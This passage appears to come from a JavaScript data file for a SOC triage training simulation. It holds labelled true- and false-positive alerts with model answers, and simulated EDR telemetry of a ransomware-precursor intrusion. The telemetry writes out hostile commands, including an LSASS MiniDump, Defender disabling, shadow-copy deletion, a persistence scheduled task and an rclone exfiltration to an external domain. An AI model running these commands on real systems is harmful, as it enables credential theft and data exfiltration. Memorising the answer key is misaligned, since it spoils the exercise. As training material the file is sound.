        reply: { fp: 'Confirmed with Yusuf and ticket HD-2291 - he is clearing DHCP lease failures from this morning\'s patch wave using signed PsExec from his own admin session on JUMP01. Different account, different commands than anything resembling the real incident. Close as FP.' },
        keywords: ['psexec', 'lateral movement', 'jump host', 'patch stragglers', 'sysinternals'],
        userReply: 'Yeah that was me, mopping up the last few machines that failed the SCCM push, had to force the IP renew after patch. All logged in HD-2291.',
        helpdeskReply: "Confirmed, Yusuf's got a change ticket open for stragglers today, that is expected." }),

    al('A-2107', '09:25', 'Encoded PowerShell command execution', 'high', 'EDR', 'EDR-PS-003 Encoded PowerShell execution', 'h-ws-hvoss', 'u-hvoss',
      'powershell.exe executed with -EncodedCommand, parent process CcmExec.exe (SCCM client), on a Finance department workstation.',
      { 'Process': 'powershell.exe -EncodedCommand', 'Parent': 'CcmExec.exe', 'Host': 'WKS-HVOSS' },
      ['e-fp6-01', 'e-fp6-02', 'e-fp6-03', 'e-fp6-04'],
      [{ type: 'host', value: 'WKS-HVOSS' }], 'FP',
      { explain: 'The encoded command is the SCCM-pushed compliance verification script for the November rollup (Verify-NovRollup-Compliance.ps1), launched by the SCCM client (CcmExec.exe) as SYSTEM, confirmed by the SCCM script log; it made no network connections and wrote only inside C:\\Windows\\CCM.',
        reply: { fp: 'SCCM script log confirms this is Verify-NovRollup-Compliance.ps1, part of the patch compliance baseline, running as SYSTEM under CcmExec.exe. No network activity or file writes outside the CCM cache. Close as FP.' },
        keywords: ['encoded powershell', 'sccm', 'compliance script', 'ccmexec'] }),

    al('A-2108', '09:35', 'New Windows service installed outside change window', 'medium', 'SIEM', 'SIEM-Persist-014 New service creation', 'h-ws-rcastellano', 'u-rcastellano',
      'A new Windows service (WdNisSvc) was installed on a Quality department endpoint shortly after a reboot.',
      { 'Service': 'WdNisSvc', 'Image path': '%ProgramFiles%\\Windows Defender\\NisSrv.exe' },
      ['e-fp7-01', 'e-fp7-02', 'e-fp7-03', 'e-fp7-04'],
      [{ type: 'host', value: 'WKS-RCASTELLANO' }], 'FP',
      { explain: 'WdNisSvc is the Windows Defender Network Inspection Service, (re)installed as part of the November security rollup per the SCCM deployment log; benign Microsoft component.',
        reply: { fp: 'SCCM deployment log confirms this host received the November rollup, which includes the Defender Network Inspection Service. Standard component, close as FP.' },
        keywords: ['new service', 'defender', 'patch install'] }),

    al('A-2109', '09:40', 'Service account interactive/remote logon from unusual workstation', 'high', 'SIEM', 'IAM-corr-091 Service account interactive use', 'h-fs02', 'u-svc-backup',
      'svc-backup authenticated to file server FS02 from an endpoint that does not normally initiate backup operations, followed by a string of reconnaissance commands.',
      { 'Logon type': '3 (Network/NTLM)', 'Source host': 'WKS-WBOYCE (10.40.14.63)', 'Account': 'svc-backup', 'Normal source': 'BKP01 (Kerberos)' },
      ['e-tp-005', 'e-tp-006', 'e-tp-007', 'e-tp-008', 'e-tp-009', 'e-tp-010'],
      [{ type: 'user', value: 'svc-backup' }, { type: 'host', value: 'WKS-WBOYCE' }, { type: 'ip', value: '10.40.14.63' }], 'TP',
      { incident: 'INC-1',
        explain: 'svc-backup normally authenticates only from BKP01 via Kerberos during the 01:00-05:00 backup window. Here it logged on via NTLM from WKS-WBOYCE, a warehouse supervisor workstation with no legitimate backup function, at 06:47, and immediately ran whoami, net group "domain admins" /domain, nltest /domain_trusts and AdFind - reconnaissance, not a backup job. EDR on WKS-WBOYCE shows an earlier LSASS credential dump (comsvcs.dll MiniDump) explaining how the account was stolen.',
        reply: { tp: 'Confirmed compromise. svc-backup credentials were stolen via an LSASS dump on WKS-WBOYCE and used to log on to FS02 outside any backup job context, followed by domain recon. Escalating as INC-1.' },
        keywords: ['svc-backup', 'service account', 'unusual logon', 'ntlm', 'discovery', 'adfind', 'domain admins'],
        helpdeskReply: 'Walter Boyce has not opened any ticket about backup tools or FS02 access. His workstation is not in scope for any backup administration.' }),

    al('A-2110', '09:55', 'Defender quarantine immediately following definition update', 'medium', 'EDR', 'EDR-AV-definitions-Quarantine', 'h-ws-tmull', 'u-tmull',
      'Windows Defender quarantined a running process on a Warehouse endpoint seconds after a signature update was applied.',
      { 'Threat name': 'Trojan:Script/Wacatac.B!ml', 'Process': 'invtrack_agent.exe' },
      ['e-fp8-01', 'e-fp8-02', 'e-fp8-03', 'e-fp8-04'],
      [{ type: 'hash', value: 'h_invtrack_9988776655443322110099887766554433221100998877665544332211009' }], 'FP',
      { explain: 'invtrack_agent.exe is the internal warehouse inventory scanner agent; Wacatac.B!ml is a known Defender heuristic false positive on this binary following the 1.423.112.0 definition update, confirmed benign by CTI (Lena Fischer\'s digest) and reproduced on a second host.',
        reply: { fp: 'Known Defender heuristic FP on invtrack_agent.exe, confirmed in CTI\'s digest and reproduced on WKS-RCASTELLANO with the same signature version. Vendor confirms the binary is clean. Close as FP.' },
        keywords: ['defender', 'false positive', 'definition update', 'quarantine'] }),

    al('A-2111', '10:05', 'Suspicious installer flagged by packer heuristic', 'high', 'EDR', 'EDR-Malware-002 Suspicious installer flagged', 'h-ws-mquinn', 'u-mquinn',
      'EDR heuristic flagged a newly downloaded and executed installer binary as a possible packed/suspicious executable.',
      { 'File': 'MeridianERPSetup_v14.2.exe', 'Publisher': 'Meridian Systems Inc. (signed)', 'Flag': 'packed binary heuristic match' },
      ['e-fp9-01', 'e-fp9-02', 'e-fp9-03', 'e-fp9-04', 'e-fp9-05', 'e-fp9-06'],
      [{ type: 'hash', value: 'h_meridian_55aa33cc77ee99bb11dd44ff22ee66aa88cc00bb11dd22ee33ff44aa55bb66' }], 'FP',
      { explain: 'The file is a signed Meridian Systems installer downloaded directly from the vendor portal; hash matches the vendor-published checksum for v14.2. Packer heuristics commonly flag legitimate installers that compress their payload - not malicious.',
        reply: { fp: 'Hash matches the vendor-published release checksum and the binary is Authenticode-signed by Meridian Systems. This was Miles installing the ERP module update at Felix\'s request. Close as FP.' },
        keywords: ['installer', 'packer heuristic', 'signed binary', 'vendor software'],
        userReply: "That's the ERP module update Felix asked me to install today, got it straight from Meridian's portal." }),

    al('A-2112', '10:20', 'Repeated failed logons leading to account lockout', 'medium', 'IAM', 'IAM-Lockout-003 Repeated failed logon leading to lockout', 'h-dc01', 'u-hvoss',
      '20 failed logon attempts for a single Finance user within 5 minutes, ending in an automatic account lockout.',
      { 'Account': 'hvoss', 'Source': 'HVOSS-PHONE', 'Attempts': '20+' },
      ['e-fp11-01', 'e-fp11-02', 'e-fp11-03', 'e-fp11-04', 'e-fp11-05'],
      [{ type: 'user', value: 'hvoss' }], 'FP',
      { explain: 'Hannah\'s phone had a cached password that was invalidated by this morning\'s mandatory patch-day password rotation reminder; helpdesk ticket HD-2298 confirms the lockout was self-resolved once the phone password was updated.',
        reply: { fp: 'Confirmed self-inflicted lockout from a stale cached password on her phone after the rotation reminder, per HD-2298. No other account activity of concern. Close as FP.' },
        keywords: ['failed logon', 'account lockout', 'cached password'],
        helpdeskReply: "Hannah called in, her phone had the old password cached after the mandatory reset reminder this morning, reset it and the lockout cleared." }),

    al('A-2113', '10:50', 'Security tooling disabled and shadow copies deleted on file server', 'critical', 'EDR', 'EDR-Tamper-004 Security tooling disabled', 'h-fs02', 'u-svc-backup',
      'Real-time protection was disabled via PowerShell, the Defender service was stopped and set to disabled, and all volume shadow copies were deleted on file server FS02.',
      { 'Commands': 'Set-MpPreference -DisableRealtimeMonitoring, sc stop WinDefend, vssadmin delete shadows /all', 'Service installed': 'PSEXESVC', 'Account': 'svc-backup' },
      ['e-tp-011', 'e-tp-012', 'e-tp-013', 'e-tp-014', 'e-tp-015', 'e-tp-016'],
      [{ type: 'host', value: 'FS02' }, { type: 'hash', value: 'h_psexesvc_f1e2d3c4b5a697887766554433221100aabbccddeeff00112233445566778' }], 'TP',
      { incident: 'INC-1',
        explain: 'This is classic ransomware-precursor tradecraft: disable AV/EDR, delete shadow copies so recovery is harder, and drop a PsExec-style service for further lateral movement - all executed by the same compromised svc-backup session identified in A-2109, not by any legitimate Veeam or backup maintenance job (which never disables Defender or deletes shadow copies).',
        reply: { tp: 'This confirms active ransomware-precursor behavior: Defender disabled, shadow copies wiped, and a PsExec service dropped, all under the compromised svc-backup session. IR is being engaged under INC-1.' },
        keywords: ['defender tamper', 'vssadmin', 'shadow copies', 'psexesvc', 'ransomware precursor', 'svc-backup'] }),

    al('A-2114', '11:05', 'Large outbound transfer from backup server to cloud repository', 'critical', 'NDR', 'NDR-Transfer-006 Large outbound transfer', 'h-bkp01', 'u-svc-backup',
      'Backup server BKP01 sent approximately 4.2GB to an external HTTPS endpoint under the svc-backup service account.',
      { 'Destination': '198.51.100.22:443', 'Bytes out': '4.2GB', 'Process': 'Veeam.Backup.Transport.exe' },
      ['e-fp13-01', 'e-fp13-02', 'e-fp13-03', 'e-fp13-04', 'e-fp13-05'],
      [{ type: 'ip', value: '198.51.100.22' }], 'FP',
      { explain: 'This is the legitimate Offsite-Cloud-FullSync Veeam job, rescheduled to daytime per CHG-4499 because the normal overnight window conflicted with Patch Tuesday maintenance. Source is BKP01 itself via Kerberos (not a workstation via NTLM), the destination is the documented corporate Azure Blob DR endpoint (confirmed benign in intel), and the Veeam job log shows a clean Success - contrast with A-2115, which moves data from FS02 to an unknown domain over rclone.',
        reply: { fp: 'Matches CHG-4499, the rescheduled offsite backup sync. Source is BKP01 using its normal Kerberos-authenticated svc-backup session, destination is the documented Azure Blob DR endpoint, and the Veeam job log confirms Success. Close as FP - but good catch flagging svc-backup traffic for review given everything else going on today.' },
        keywords: ['large transfer', 'svc-backup', 'veeam', 'offsite backup', 'cloud repository'] }),

    al('A-2115', '11:35', 'Archive staged and transferred to unfamiliar external domain', 'high', 'NDR', 'NDR-exfil-017 Archive+cloud-sync egress', 'h-fs02', 'u-svc-backup',
      'A 7-Zip archive was staged from two file shares and uploaded via a cloud-sync utility to a domain not previously seen in this environment.',
      { 'Archive': 'C:\\Windows\\Temp\\upd_cache.7z (812MB)', 'Tool': 'rclone.exe', 'Destination': 'swift-filedrop.com (203.0.113.77)' },
      ['e-tp-022', 'e-tp-023', 'e-tp-024', 'e-tp-025', 'e-tp-026', 'e-tp-027'],
      [{ type: 'domain', value: 'swift-filedrop.com' }, { type: 'ip', value: '203.0.113.77' }, { type: 'hash', value: 'h_rclone_7f3a9c1d2e4b5f608192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f' }], 'TP',
      { incident: 'INC-1',
        explain: 'rclone.exe (a legitimate tool, here renamed/dropped outside Program Files) staged an archive of Finance and Engineering shares and uploaded it to swift-filedrop.com, a domain with no prior presence in DNS/proxy history and flagged malicious by intel - this is the data-exfiltration stage of the same compromised svc-backup session from A-2109/A-2113. Contrast with A-2114: different host (FS02, not BKP01), different tool (rclone to an unknown domain, not the Veeam job to the documented Azure endpoint), and no change ticket covers this activity.',
        reply: { tp: 'Confirms exfiltration staged from FS02 to an unregistered external domain via rclone under the same compromised svc-backup session. No change ticket covers this, and the destination is confirmed malicious. This closes out INC-1 - recommend isolating FS02 and BKP01 and resetting svc-backup credentials.' },
        keywords: ['exfiltration', 'rclone', '7zip', 'swift-filedrop', 'svc-backup', 'archive staging'] }),

    al('A-2116', '11:45', 'Remote logon to jump host from previously unseen external IP', 'medium', 'IAM', 'IAM-GeoAnomaly-011 Logon from unfamiliar external IP', 'h-jump01', null,
      'An RDP logon to JUMP01 originated from an external IP address not previously associated with this account.',
      { 'Source IP': '198.51.100.44', 'Logon type': '10 (RemoteInteractive)', 'Account': 'vendorsupport' },
      ['e-fp14-01', 'e-fp14-02', 'e-fp14-03', 'e-fp14-04'],
      [{ type: 'ip', value: '198.51.100.44' }], 'FP',
      { explain: 'This is the scheduled Meridian Systems vendor remote-support session for ERP invoicing troubleshooting, documented in CHG-4490 and helpdesk ticket HD-2302; the NAT IP is the known egress for Meridian\'s VPN gateway, confirmed benign in intel.',
        reply: { fp: 'Matches CHG-4490, the scheduled vendor remote session. IP is Meridian\'s documented VPN egress and the session was approved by Felix Amaro. Close as FP.' },
        keywords: ['vendor remote access', 'rdp', 'external ip', 'jump host'] }),

    al('A-2117', '12:10', 'Account added to a privileged local/administrative group', 'high', 'SIEM', 'SIEM-Priv-006 Privileged group membership modified', 'h-dc01', 'u-opratt',
      'An account was added to an administrative group on a domain-joined computer object.',
      { 'Group': 'Administrators (local, WKS-CDAO)', 'Member added': 'cdao', 'Actor': 'opratt' },
      ['e-fp15-01', 'e-fp15-02', 'e-fp15-03', 'e-fp15-04'],
      [{ type: 'user', value: 'cdao' }], 'FP',
      { explain: 'This is a local Administrators group addition on a single new-hire laptop (WKS-CDAO) during imaging, performed by helpdesk under ticket HD-2305 and CHG-4487 - not an addition to Domain Admins or any domain-wide privileged group, which remains unchanged today.',
        reply: { fp: 'Confirmed local-only, single workstation, documented imaging ticket HD-2305 under CHG-4487. Domain Admins membership was checked and is unchanged. Close as FP.' },
        keywords: ['privileged group', 'local administrators', 'domain admins', 'imaging'] }),

    al('A-2118', '13:05', 'Critical database service stopped unexpectedly', 'high', 'SIEM', 'SIEM-Avail-009 Critical database service stopped', 'h-sql01', 'u-dkowalski',
      'SQL Server (MSSQLSERVER) and the associated SQL Server Agent service both entered a stopped state on the production database server.',
      { 'Services': 'MSSQLSERVER, SQLSERVERAGENT', 'Host': 'SQL01' },
      ['e-fp12-01', 'e-fp12-02', 'e-fp12-03', 'e-fp12-04', 'e-fp12-05'],
      [{ type: 'host', value: 'SQL01' }], 'FP',
      { explain: 'SQL01\'s patch reboot window (CHG-4495, 13:00-13:30) was approved by Dmitri Kowalski; both services returned to a running state within 5 minutes, consistent with a planned reboot rather than an outage or tampering.',
        reply: { fp: 'Matches CHG-4495, the approved SQL01 patch reboot window. Both services came back up within minutes. Close as FP.' },
        keywords: ['sql server', 'service stopped', 'patch reboot', 'database'] }),

    al('A-2119', '14:05', 'Removable USB storage device connected to endpoint', 'low', 'DLP', 'DLP-USB-002 Removable storage device attached', 'h-ws-tmull', 'u-tmull',
      'A USB mass-storage-class device was connected to a Warehouse department endpoint.',
      { 'Device': 'Zebra Barcode Scanner Cradle', 'Serial': 'ZB5750-0019' },
      ['e-fp16-01', 'e-fp16-02', 'e-fp16-03', 'e-fp16-04'],
      [{ type: 'host', value: 'WKS-TMULL' }], 'FP',
      { explain: 'This is the new barcode scanner dock rolled out to shipping this week under helpdesk ticket HD-2299; the device enumerates as a known scanner cradle, not a generic mass-storage drive, and no bulk file copy followed.',
        reply: { fp: 'Confirmed as the new scanner dock deployment under HD-2299. No bulk file transfer followed the device connection. Close as FP.' },
        keywords: ['usb device', 'removable storage', 'warehouse', 'barcode scanner'],
        helpdeskReply: "That's the new barcode scanner dock IT rolled out to shipping this week, ticket HD-2299." }),

    al('A-2120', '14:40', 'User visited newly-registered lookalike domain', 'low', 'Proxy', 'Proxy-TyposquatLookalike-004 Visit to newly-registered lookalike domain', 'h-ws-iferraro', 'u-iferraro',
      'A user browsed to a domain with high lexical similarity to the corporate domain name, registered within the last 30 days.',
      { 'Domain': 'cf-industrialsupply-portal.net', 'Referrer': 'inbound email' },
      ['e-fp17-01', 'e-fp17-02', 'e-fp17-03', 'e-fp17-04'],
      [{ type: 'domain', value: 'cf-industrialsupply-portal.net' }], 'FP',
      { explain: 'The domain is a marketing-agency-hosted trade show giveaway landing page sent out by Caldwell-Fenn marketing, confirmed benign by intel - lexical similarity rules will flag it, but there is no credential prompt, redirect chain, or malicious content on the page.',
        reply: { fp: 'Confirmed benign - marketing agency landing page for the trade show giveaway campaign, referenced in the newsletter email. No credential harvesting or malicious redirect. Close as FP.' },
        keywords: ['lookalike domain', 'typosquat', 'marketing', 'phishing review'],
        userReply: 'Oh that\'s the trade show giveaway page marketing sent out, I clicked the link from the newsletter.' })
  ];

  const edr = {
    'h-ws-wboyce': {
      processes: [
        { pid: 100, ppid: null, name: 'winlogon.exe', cmd: 'winlogon.exe', user: 'NT AUTHORITY\\SYSTEM', start: '06:30:00', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-winlogon', flag: null, note: 'Session manager' },
        { pid: 200, ppid: 100, name: 'explorer.exe', cmd: 'C:\\Windows\\explorer.exe', user: 'CORP\\wboyce', start: '06:31:10', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-explorer', flag: null, note: 'User shell' },
        { pid: 300, ppid: 200, name: 'powershell.exe', cmd: 'powershell.exe -nop -w hidden -enc JABzAD0AT...', user: 'CORP\\wboyce', start: '06:38:10', signed: true, publisher: 'Microsoft Corporation', sha256: 'h_loader_a9c3e5f7b1d3f5a7c9e1b3d5f7a9c1e3b5d7f9a1c3e5b7d9f1a3c5e7b9d1f3a', flag: 'malicious', note: 'Hidden-window encoded PowerShell stager, unusual for this user/role' },
        { pid: 305, ppid: 300, name: 'cmd.exe', cmd: 'cmd /c copy C:\\Users\\Public\\dw1.tmp C:\\Users\\Public\\dw1.bak', user: 'CORP\\wboyce', start: '06:39:40', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-cmd', flag: 'suspicious', note: 'Staging credential dump output' },
        { pid: 310, ppid: 305, name: 'rundll32.exe', cmd: 'rundll32.exe comsvcs.dll MiniDump 912 C:\\Users\\Public\\dw1.tmp full', user: 'CORP\\wboyce', start: '06:39:02', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-rundll32', flag: 'malicious', note: 'LSASS memory dump via comsvcs.dll MiniDump - credential theft technique' },
        { pid: 315, ppid: 300, name: 'cmd.exe', cmd: 'cmd /c tasklist /v', user: 'CORP\\wboyce', start: '06:45:10', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-cmd', flag: 'suspicious', note: 'Process enumeration' },
        { pid: 330, ppid: 300, name: 'wsmprovhost.exe', cmd: 'wsmprovhost.exe -Embedding', user: 'CORP\\wboyce', start: '06:40:40', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-wsmprovhost', flag: 'suspicious', note: 'WinRM remote session host - establishing New-PSSession to FS02' }
      ],
      connections: [
        { t: '06:40:55', pid: 330, proc: 'wsmprovhost.exe', dst: '10.40.0.51:5985', domain: null, proto: 'TCP' }
      ],
      files: [
        { t: '06:39:02', pid: 310, op: 'create', path: 'C:\\Users\\Public\\dw1.tmp', sha256: 'h_lsassdump_912tmp' },
        { t: '06:39:40', pid: 305, op: 'create', path: 'C:\\Users\\Public\\dw1.bak', sha256: 'h_lsassdump_912bak' },
        { t: '06:46:20', pid: 310, op: 'delete', path: 'C:\\Users\\Public\\dw1.tmp', sha256: 'h_lsassdump_912tmp' }
      ]
    },
    'h-fs02': {
      processes: [
        { pid: 50, ppid: null, name: 'services.exe', cmd: 'services.exe', user: 'NT AUTHORITY\\SYSTEM', start: '00:00:00', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-services', flag: null, note: 'Service control manager' },
        { pid: 60, ppid: 50, name: 'svchost.exe', cmd: 'svchost.exe -k NetworkService -p', user: 'NT AUTHORITY\\NETWORK SERVICE', start: '00:00:05', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-svchost-winrm', flag: null, note: 'WinRM service host' },
        { pid: 4000, ppid: 60, name: 'wsmprovhost.exe', cmd: 'wsmprovhost.exe -Embedding', user: 'CORP\\svc-backup', start: '06:47:05', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-wsmprovhost', flag: 'suspicious', note: 'Remote WinRM session for svc-backup originating from WKS-WBOYCE, not BKP01' },
        { pid: 4010, ppid: 4000, name: 'cmd.exe', cmd: 'cmd /c whoami /all', user: 'CORP\\svc-backup', start: '06:47:40', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-cmd', flag: 'suspicious', note: 'Identity recon' },
        { pid: 4020, ppid: 4000, name: 'powershell.exe', cmd: 'powershell -nop -w hidden -c "net group \'\'domain admins\'\' /domain"', user: 'CORP\\svc-backup', start: '06:48:15', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-powershell', flag: 'suspicious', note: 'Privileged group enumeration' },
        { pid: 4030, ppid: 4000, name: 'nltest.exe', cmd: 'nltest /domain_trusts', user: 'CORP\\svc-backup', start: '06:49:10', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-nltest', flag: 'suspicious', note: 'Domain trust enumeration' },
        { pid: 4040, ppid: 4000, name: 'AdFind.exe', cmd: 'AdFind.exe -f (objectcategory=person) -dsq -list', user: 'CORP\\svc-backup', start: '06:49:55', signed: false, publisher: null, sha256: 'h_adfind_2b5e1f3a7c9d8b6e4f0a1c3d5e7f9b1a3c5e7f9b1d3f5a7c9e1b3d5f7a9c1e3', flag: 'malicious', note: 'AdFind - widely abused by ransomware actors for AD recon, dropped in C:\\Windows\\Temp\\adf' },
        { pid: 4011, ppid: 4000, name: 'cmd.exe', cmd: 'cmd /c net localgroup administrators', user: 'CORP\\svc-backup', start: '06:50:40', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-cmd', flag: 'suspicious', note: 'Local admin enumeration' },
        { pid: 4021, ppid: 4000, name: 'powershell.exe', cmd: 'powershell -c Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true', user: 'CORP\\svc-backup', start: '06:52:10', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-powershell', flag: 'malicious', note: 'Defender tamper - disabling real-time protection' },
        { pid: 4050, ppid: 4000, name: 'sc.exe', cmd: 'sc stop WinDefend', user: 'CORP\\svc-backup', start: '06:52:45', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-sc', flag: 'malicious', note: 'Stopping Defender service' },
        { pid: 4051, ppid: 4000, name: 'sc.exe', cmd: 'sc config WinDefend start= disabled', user: 'CORP\\svc-backup', start: '06:53:05', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-sc', flag: 'malicious', note: 'Disabling Defender service start type' },
        { pid: 4060, ppid: 4000, name: 'vssadmin.exe', cmd: 'vssadmin delete shadows /all', user: 'CORP\\svc-backup', start: '06:55:20', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-vssadmin', flag: 'malicious', note: 'Shadow copy deletion - ransomware precursor, removes local recovery points' },
        { pid: 4070, ppid: 50, name: 'PSEXESVC.exe', cmd: '%SystemRoot%\\PSEXESVC.exe', user: 'NT AUTHORITY\\SYSTEM', start: '06:56:50', signed: false, publisher: null, sha256: 'h_psexesvc_f1e2d3c4b5a697887766554433221100aabbccddeeff00112233445566778', flag: 'malicious', note: 'PsExec service dropped via SMB from WKS-WBOYCE outside any change window; hash differs from legitimate Sysinternals release' },
        { pid: 4012, ppid: 4000, name: 'cmd.exe', cmd: 'cmd /c schtasks /create /tn "WindowsUpdateCheck" /tr C:\\Windows\\Temp\\svcupd.exe /sc onstart /ru SYSTEM', user: 'CORP\\svc-backup', start: '07:01:00', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-cmd', flag: 'malicious', note: 'Persistence via disguised scheduled task' },
        { pid: 4013, ppid: 4000, name: 'cmd.exe', cmd: 'cmd /c dir \\\\FS02\\Finance$ /s /b', user: 'CORP\\svc-backup', start: '07:00:10', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-cmd', flag: 'suspicious', note: 'Enumerating Finance share before staging' },
        { pid: 4014, ppid: 4000, name: 'cmd.exe', cmd: 'cmd /c dir \\\\FS02\\Engineering$ /s /b', user: 'CORP\\svc-backup', start: '07:00:35', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-cmd', flag: 'suspicious', note: 'Enumerating Engineering share before staging' },
        { pid: 4080, ppid: 4021, name: '7za.exe', cmd: '7za.exe a -mx1 C:\\Windows\\Temp\\upd_cache.7z \\\\FS02\\Finance$ \\\\FS02\\Engineering$', user: 'CORP\\svc-backup', start: '07:05:00', signed: true, publisher: 'Igor Pavlov (7-Zip)', sha256: 'h_7zip_c4ca4238a0b923820dcc509a6f75849bd1e2c3f4a5b6c7d8e9f0a1b2c3d4e5f6', flag: 'suspicious', note: 'Legitimate 7-Zip binary, but staging Finance+Engineering data to Windows\\Temp is abnormal for this account' },
        { pid: 4090, ppid: 4000, name: 'rclone.exe', cmd: 'rclone.exe copy C:\\Windows\\Temp\\upd_cache.7z remote:backup --config C:\\Windows\\Temp\\rc.conf', user: 'CORP\\svc-backup', start: '07:12:15', signed: false, publisher: null, sha256: 'h_rclone_7f3a9c1d2e4b5f608192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f', flag: 'malicious', note: 'Renamed/unsigned rclone copy used for exfiltration to an unregistered external domain' },
        { pid: 4022, ppid: 4000, name: 'powershell.exe', cmd: 'powershell -c Remove-Item C:\\Windows\\Temp\\upd_cache.7z -Force', user: 'CORP\\svc-backup', start: '07:21:00', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-powershell', flag: 'malicious', note: 'Cleanup of staged archive after exfil' }
      ],
      connections: [
        { t: '06:40:55', pid: 4000, proc: 'wsmprovhost.exe', dst: '10.40.14.63:52110', domain: null, proto: 'TCP' },
        { t: '07:12:15', pid: 4090, proc: 'rclone.exe', dst: '203.0.113.77:443', domain: 'swift-filedrop.com', proto: 'TCP' },
        { t: '07:20:10', pid: 4090, proc: 'rclone.exe', dst: '203.0.113.77:443', domain: 'swift-filedrop.com', proto: 'TCP' }
      ],
      files: [
        { t: '07:09:40', pid: 4080, op: 'create', path: 'C:\\Windows\\Temp\\upd_cache.7z', sha256: 'h_updcache_812mb' },
        { t: '07:22:40', pid: 4022, op: 'delete', path: 'C:\\Windows\\Temp\\upd_cache.7z', sha256: 'h_updcache_812mb' }
      ]
    },
    'h-jump01': {
      processes: [
        { pid: 10, ppid: null, name: 'winlogon.exe', cmd: 'winlogon.exe', user: 'NT AUTHORITY\\SYSTEM', start: '00:00:00', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-winlogon', flag: null, note: 'Session manager' },
        { pid: 30, ppid: 10, name: 'explorer.exe', cmd: 'C:\\Windows\\explorer.exe', user: 'CORP\\ykhatri', start: '09:08:05', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-explorer', flag: null, note: 'User shell, interactive RDP session' },
        { pid: 2000, ppid: 30, name: 'cmd.exe', cmd: 'cmd.exe', user: 'CORP\\ykhatri', start: '09:09:00', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-cmd', flag: null, note: 'Admin console' },
        { pid: 2010, ppid: 2000, name: 'PsExec64.exe', cmd: 'PsExec64.exe \\\\WKS-STRAIN cmd /c "ipconfig /renew"', user: 'CORP\\ykhatri', start: '09:09:12', signed: true, publisher: 'Sysinternals - a Microsoft subsidiary', sha256: 'h_psexec_legit_00112233445566778899aabbccddeeff0011223344556677889900aabbccd', flag: null, note: 'Authorized remote admin use per HD-2291' },
        { pid: 2011, ppid: 2000, name: 'PsExec64.exe', cmd: 'PsExec64.exe \\\\WKS-IFERRARO cmd /c "ipconfig /renew"', user: 'CORP\\ykhatri', start: '09:09:55', signed: true, publisher: 'Sysinternals - a Microsoft subsidiary', sha256: 'h_psexec_legit_00112233445566778899aabbccddeeff0011223344556677889900aabbccd', flag: null, note: 'Authorized remote admin use per HD-2291' },
        { pid: 2012, ppid: 2000, name: 'PsExec64.exe', cmd: 'psexec64.exe \\\\WKS-PENSLEY cmd /c ipconfig /renew', user: 'CORP\\ykhatri', start: '09:10:35', signed: true, publisher: 'Sysinternals - a Microsoft subsidiary', sha256: 'h_psexec_legit_00112233445566778899aabbccddeeff0011223344556677889900aabbccd', flag: null, note: 'Authorized remote admin use per HD-2291' },
        { pid: 40, ppid: 10, name: 'explorer.exe', cmd: 'C:\\Windows\\explorer.exe', user: 'vendorsupport', start: '11:15:05', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-explorer', flag: null, note: 'Vendor remote support session shell' },
        { pid: 2100, ppid: 40, name: 'erp_diag.exe', cmd: 'erp_diag.exe --connect SQL01 --module invoicing', user: 'vendorsupport', start: '11:15:30', signed: true, publisher: 'Meridian Systems Inc.', sha256: 'h_erpdiag_vendor', flag: null, note: 'Vendor diagnostic tool, approved session HD-2302' }
      ],
      connections: [
        { t: '09:09:12', pid: 2010, proc: 'PsExec64.exe', dst: '10.40.12.21:445', domain: null, proto: 'TCP' },
        { t: '09:09:55', pid: 2011, proc: 'PsExec64.exe', dst: '10.40.13.32:445', domain: null, proto: 'TCP' },
        { t: '09:10:35', pid: 2012, proc: 'PsExec64.exe', dst: '10.40.13.33:445', domain: null, proto: 'TCP' }
      ],
      files: []
    },
    'h-ws-hvoss': {
      processes: [
        { pid: 10, ppid: null, name: 'services.exe', cmd: 'services.exe', user: 'NT AUTHORITY\\SYSTEM', start: '00:00:00', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-services', flag: null, note: 'Service control manager' },
        { pid: 900, ppid: 10, name: 'CcmExec.exe', cmd: 'C:\\Windows\\CCM\\CcmExec.exe', user: 'NT AUTHORITY\\SYSTEM', start: '00:00:10', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-ccmexec', flag: null, note: 'SCCM client service' },
        { pid: 910, ppid: 900, name: 'powershell.exe', cmd: 'powershell.exe -NoProfile -EncodedCommand JABwAGEAdABjAGgAIABjAG8AbQBwAGwAaQBhAG4AYwBlAA==', user: 'NT AUTHORITY\\SYSTEM', start: '09:24:10', signed: true, publisher: 'Microsoft Corporation', sha256: 'h_sccmscript_112233445566778899aabbccddeeff00112233445566778899aabbccddeef', flag: null, note: 'Decodes to Verify-NovRollup-Compliance.ps1, confirmed by SCCM script log' }
      ],
      connections: [],
      files: []
    },
    'h-ws-tmull': {
      processes: [
        { pid: 10, ppid: null, name: 'services.exe', cmd: 'services.exe', user: 'NT AUTHORITY\\SYSTEM', start: '00:00:00', signed: true, publisher: 'Microsoft Corporation', sha256: 'sys-services', flag: null, note: 'Service control manager' },
